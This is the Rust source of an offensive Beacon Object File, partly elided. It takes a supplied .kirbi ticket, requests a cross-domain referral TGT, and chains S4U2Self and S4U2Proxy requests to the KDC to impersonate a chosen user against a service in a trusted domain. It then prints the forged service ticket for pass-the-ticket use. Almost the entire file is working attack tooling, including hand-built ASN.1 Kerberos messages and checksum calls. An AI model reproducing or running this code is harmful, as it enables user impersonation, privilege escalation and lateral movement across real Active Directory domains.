//! # Cross-domain S4U BOF
//!
//! Performs the referral TGT, S4U2Self, and S4U2Proxy request chain for
//! cross-domain constrained delegation across an existing domain trust.
//!
//! ## MITRE ATT&CK
...
fn asn_tl(tag: u8, data: &[u8]) -> Vec<u8> {
    let mut o = vec![tag];
    let l = data.len();
    if l < 0x80 {
        o.push(l as u8);
...
fn asn_int(v: i64) -> Vec<u8> {
    ...
    let mut o = vec![0x02, b.len() as u8];
    o.extend_from_slice(&b);
    o
}
fn asn_str(s: &str) -> Vec<u8> {
    asn_tl(0x1b, s.as_bytes())
}
...
const KRB_KEY_USAGE_KRB_NON_KERB_CKSUM_SALT: u32 = 17;
const KERB_CHECKSUM_HMAC_MD5: i32 = -138;
...
type ChecksumInitializeFn = unsafe extern "system" fn(u32, *mut *mut c_void) -> i32;
type ChecksumSumFn = unsafe extern "system" fn(*mut c_void, u32, *const c_void) -> i32;
type ChecksumFinalizeFn = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
type ChecksumFinishFn = unsafe extern "system" fn(*mut *mut c_void) -> i32;
type ChecksumInitializeExFn =
    unsafe extern "system" fn(*const c_void, u32, u32, *mut *mut c_void) -> i32;
type ChecksumInitializeEx2Fn =
    unsafe extern "system" fn(*const c_void, u32, *const c_void, u32, *mut *mut c_void) -> i32;
...
struct KerbChecksum {
    ...
    checksum_size: u32,
    attributes: u32,
    initialize: ChecksumInitializeFn,
    sum: ChecksumSumFn,
    finalize: ChecksumFinalizeFn,
    finish: ChecksumFinishFn,
    initialize_ex: ChecksumInitializeExFn,
    initialize_ex2: ChecksumInitializeEx2Fn,
}

type CDLocateCheckSumFn = unsafe extern "system" fn(u32, *mut *const KerbChecksum) -> i32;
type SystemFunction036Fn = unsafe extern "system" fn(*mut u8, u32) -> u8;

struct CryptApi {
    cd_locate: CDLocateCSystemFn,
    cd_checksum: CDLocateCheckSumFn,
...
fn load_crypt_api() -> Option<CryptApi> {
    unsafe {
        ...
        let checksum = GetProcAddress(cryptdll, b"CDLocateCheckSum\0".as_ptr());
        let sf = GetProcAddress(advapi, b"SystemFunction036\0".as_ptr());
        if cd.is_null() || checksum.is_null() || sf.is_null() {
            return None;
        }
        Some(CryptApi {
            cd_locate: core::mem::transmute(cd),
            cd_checksum: core::mem::transmute(checksum),
            rand: core::mem::transmute(sf),
        })
    }
}
...
fn checksum_data(
    ...
    unsafe {
        let mut checksum: *const KerbChecksum = core::ptr::null();
        if (api.cd_checksum)(checksum_type as u32, &mut checksum) < 0 || checksum.is_null() {
            return None;
        }
        let mut context: *mut c_void = core::ptr::null_mut();
        if ((*checksum).initialize_ex)(
        ...
        let mut output = vec![0u8; (*checksum).checksum_size as usize];
        let sum_status =
            ((*checksum).sum)(context, data.len() as u32, data.as_ptr() as *const c_void);
        let final_status = if sum_status >= 0 {
            ((*checksum).finalize)(context, output.as_mut_ptr() as *mut c_void)
        } else {
            sum_status
        };
        ((*checksum).finish)(&mut context);
        if final_status < 0 { None } else { Some(output) }
    }
}
...
fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        ...
        if getaddrinfo(sc.as_ptr(), b"88\0".as_ptr(), &hints, &mut result) != 0 {
            WSACleanup();
            return None;
        }
...
fn base64_decode(input: &str) -> Option<Vec<u8>> {
    ...
    while i < input.len() {
        ...
        if o.len() < ol {
            o.push(((t >> 16) & 0xFF) as u8);
        }
        if o.len() < ol {
            o.push(((t >> 8) & 0xFF) as u8);
        }
        if o.len() < ol {
            o.push((t & 0xFF) as u8);
        }
...
fn parse_kirbi(kirbi_b64: &str) -> Option<KirbiInfo> {
    ...
    let key_type = find_ctx(key_seq, 0)
        .and_then(|c| c.children.first())
        .map(|c| get_int(c) as i32)
        .unwrap_or(0);
    let key_value = find_ctx(key_seq, 1)
        .and_then(|c| c.children.first())
        .map(|c| c.value.clone())
        .unwrap_or_default();

    let realm = find_ctx(first, 1)
        .and_then(|c| c.children.first())
        .map(|c| get_string(c))
        .unwrap_or_default();

    let username = find_ctx(first, 2)
        .and_then(|c| c.children.first())
        .and_then(|seq| {
            find_ctx(seq, 1)
                .and_then(|c| c.children.first())
...
fn build_tgs_req(
    ...
    service: &str,
    domain: &str,
    service_name_type: i64,
    s4u_user: Option<&str>,
    s4u_realm: Option<&str>,
    ...
    let kdc_opts = if additional_ticket.is_some() {
        0x40820010u32.to_be_bytes()
    } else if s4u_user.is_some() {
        0x40810000u32.to_be_bytes()
    } else {
        0x40810010u32.to_be_bytes()
    };

    let parts: Vec<&str> = service.split('/').collect();
    let sname = if parts.len() >= 2 {
        asn_seq(&[
            &asn_ctx_int(0, service_name_type),
            &asn_ctx(1, &asn_seq(&[&asn_str(parts[0]), &asn_str(parts[1])])),
        ])
    } else {
        asn_seq(&[
            &asn_ctx_int(0, service_name_type),
            &asn_ctx(1, &asn_seq(&[&asn_str(service)])),
        ])
    };
    ...
    if let Some(ticket) = additional_ticket {
        req_body_fields.push(asn_ctx(11, &asn_seq(&[ticket])));
    }
    let req_body_refs: Vec<&[u8]> = req_body_fields.iter().map(Vec::as_slice).collect();
    let req_body = asn_seq(&req_body_refs);

    let now = get_current_time();
    let mut cusec_bytes = [0u8; 4];
    unsafe {
        (api.rand)(cusec_bytes.as_mut_ptr(), 4);
    }
    let cusec = (u32::from_le_bytes(cusec_bytes) % 999999) as i64;
    let mut seq_bytes = [0u8; 4];
    unsafe {
        (api.rand)(seq_bytes.as_mut_ptr(), 4);
    }
    let seq_num = u32::from_le_bytes(seq_bytes) as i64;
    let cname = asn_seq(&[
        &asn_ctx_int(0, 1),
        &asn_ctx(1, &asn_seq(&[&asn_str(&kirbi.username)])),
    ]);
    let authenticator = asn_app(
        2,
        &asn_seq(&[
            &asn_ctx_int(0, 5),
    ...
    let enc_authenticator = encrypt_data(
        api,
        &kirbi.session_key,
        kirbi.key_type,
    ...
    let pa_ap_req = asn_seq(&[&asn_ctx_int(1, 1), &asn_ctx(2, &asn_oct(&ap_req_bytes))]);

    let mut pa_data = vec![pa_ap_req];
    if let Some(user) = s4u_user {
        let realm = s4u_realm.unwrap_or(domain);
        let mut checksum_input = vec![10u8, 0, 0, 0];
        checksum_input.extend_from_slice(user.as_bytes());
        ...
        let checksum = checksum_data(
            ...
            KRB_KEY_USAGE_KRB_NON_KERB_CKSUM_SALT,
            &checksum_input,
        )?;
        let user_name = asn_seq(&[
            &asn_ctx_int(0, 10),
            &asn_ctx(1, &asn_seq(&[&asn_str(user)])),
        ]);
        let checksum_asn = asn_seq(&[
            &asn_ctx_int(0, KERB_CHECKSUM_HMAC_MD5 as i64),
            &asn_ctx(1, &asn_oct(&checksum)),
        ]);
        let pa_for_user = asn_seq(&[
            &asn_ctx(0, &user_name),
            &asn_ctx_str(1, realm),
            &asn_ctx(2, &checksum_asn),
            &asn_ctx_str(3, "Kerberos"),
        ]);
        pa_data.push(asn_seq(&[
            &asn_ctx_int(1, 129),
            &asn_ctx(2, &asn_oct(&pa_for_user)),
        ]));
    }
    if additional_ticket.is_some() {
        let pac_options = asn_seq(&[&asn_ctx(0, &asn_bit(&[0x10, 0, 0, 0]))]);
        pa_data.push(asn_seq(&[
            &asn_ctx_int(1, 167),
            &asn_ctx(2, &asn_oct(&pac_options)),
        ]));
    }
    let pa_refs: Vec<&[u8]> = pa_data.iter().map(Vec::as_slice).collect();
...
fn handle_tgs_rep(api: &CryptApi, response: &[u8], kirbi: &KirbiInfo) -> Option<String> {
    ...
    let sk_type = find_ctx(sk_seq, 0)
        .and_then(|c| c.children.first())
        .map(|c| get_int(c))
        .unwrap_or(0);
    let sk_value = find_ctx(sk_seq, 1)
        .and_then(|c| c.children.first())
        .map(|c| c.value.clone())
        .unwrap_or_default();
    ...
    parts.push(&session_key_asn);
    parts.push(&prealm_asn);
    parts.push(&pname_asn);
    if !flags_asn.is_empty() {
        parts.push(&flags_asn);
    }
    if !start_asn.is_empty() {
        parts.push(&start_asn);
    }
    parts.push(&end_asn);
    if !renew_asn.is_empty() {
        parts.push(&renew_asn);
    }
    parts.push(&srealm_asn);
    if !sname_asn.is_empty() {
        parts.push(&sname_asn);
    }
    ...
    let ticket_app = ticket_raw.to_vec();
    let krb_cred = asn_app(
        22,
        &asn_seq(&[
            &asn_ctx_int(0, 5),
            &asn_ctx_int(1, 22),
            &asn_ctx(2, &asn_seq(&[&ticket_app])),
            &asn_ctx(3, &enc_data),
        ]),
    );
...
fn request_ticket(
    api: &CryptApi,
    authentication_ticket: &KirbiInfo,
    dc: &str,
    service: &str,
    request_realm: &str,
    service_name_type: i64,
    ...
    let response = match send_to_kdc(dc, &request) {
    ...
    handle_tgs_rep(api, &response, authentication_ticket)
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: Cross-domain S4U\n");

    if len == 0 {
        eprintln!("[X] /ticket, /service, /impersonateuser, /targetdomain, and /targetdc required");
        return;
    }
    ...
    let service = match get_param(&params, "/service:") {
        Some(s) => s,
        None => {
            eprintln!("[X] /service:SPN must be supplied!");
            return;
        }
    };
    let impersonate_user = match get_param(&params, "/impersonateuser:") {
        Some(user) => user,
        None => {
            eprintln!("[X] /impersonateuser:USER must be supplied!");
            return;
        }
    };
    let target_domain = match get_param(&params, "/targetdomain:") {
        Some(domain) => domain,
        None => {
            eprintln!("[X] /targetdomain:DOMAIN must be supplied!");
            return;
        }
    };
    let target_dc = match get_param(&params, "/targetdc:") {
        Some(dc) => dc,
        None => {
            eprintln!("[X] /targetdc:DC must be supplied!");
            return;
        }
    };
    let domain_arg = get_param(&params, "/domain:");
    let dc_arg = get_param(&params, "/dc:");
    if get_param(&params, "/altservice:").is_some() || get_param(&params, "/tgs:").is_some() {
        eprintln!("[X] /altservice and /tgs are not supported by cross_s4u");
        return;
    }
    ...
    let kirbi = match parse_kirbi(ticket_b64) {
        Some(k) => k,
        None => {
            eprintln!("[X] Failed to parse .kirbi ticket");
            return;
        }
    };
    ...
    let (domain, dc) = if let (Some(d), Some(c)) = (domain_arg, dc_arg) {
        ...
        match get_domain_info() {
            ...
            None => {
                eprintln!("[X] /dc:DC must be supplied!");
                return;
            }
        }
    };
    ...
    let api = match load_crypt_api() {
        Some(a) => a,
        None => {
            eprintln!("[X] Failed to load crypto");
            return;
        }
    };
    ...
    let referral_service = alloc::format!("krbtgt/{}", target_domain);
    println!(
        "[*] Requesting referral TGT from {} for {}",
        domain, target_domain
    );
    let referral_b64 = match request_ticket(
        &api,
        &kirbi,
        &dc,
        &referral_service,
    ...
    let referral = match parse_kirbi(&referral_b64) {
        Some(ticket) => ticket,
        None => {
            eprintln!("[X] Failed to parse referral TGT");
            return;
        }
    };
    println!("[+] Referral TGT received");

    let target_identity = alloc::format!("{}@{}", impersonate_user, target_domain);
    println!(
        "[*] Requesting foreign S4U2Self referral for {}",
        target_identity
    );
    let foreign_self_b64 = match request_ticket(
        &api,
        &referral,
        target_dc,
        &kirbi.username,
    ...
    let foreign_self = match parse_kirbi(&foreign_self_b64) {
        Some(ticket) => ticket,
        None => {
            eprintln!("[X] Failed to parse foreign S4U2Self referral");
            return;
        }
    };
    println!("[+] Foreign S4U2Self referral received");

    println!("[*] Requesting local S4U2Self ticket from {}", domain);
    let local_self_b64 = match request_ticket(
        &api,
        &foreign_self,
        &dc,
        &kirbi.username,
    ...
    let local_self = match parse_kirbi(&local_self_b64) {
        Some(ticket) => ticket,
        None => {
            eprintln!("[X] Failed to parse local S4U2Self ticket");
            return;
        }
    };
    println!("[+] Local S4U2Self ticket received");

    println!("[*] Requesting local S4U2Proxy referral for {}", service);
    let local_proxy_b64 = match request_ticket(
        &api,
        &kirbi,
        &dc,
        service,
        ...
        None,
        None,
        Some(&local_self.ticket_raw),
    ) {
        Some(ticket) => ticket,
        None => return,
    };
    let local_proxy = match parse_kirbi(&local_proxy_b64) {
        Some(ticket) => ticket,
        None => {
            eprintln!("[X] Failed to parse local S4U2Proxy referral");
            return;
        }
    };
    println!("[+] Local S4U2Proxy referral received");

    println!("[*] Requesting foreign S4U2Proxy service ticket");
    let final_ticket = match request_ticket(
        &api,
        &referral,
        target_dc,
        service,
        ...
        None,
        None,
        Some(&local_proxy.ticket_raw),
    ) {
        Some(ticket) => ticket,
        None => return,
    };
    println!("[+] Cross-domain S4U2Proxy request successful");
    println!("[*] base64(ticket.kirbi):\n\n{}\n", final_ticket);
    if params.contains("/ptt") {
        println!("[*] Import the ticket with the ptt BOF");
    }
}
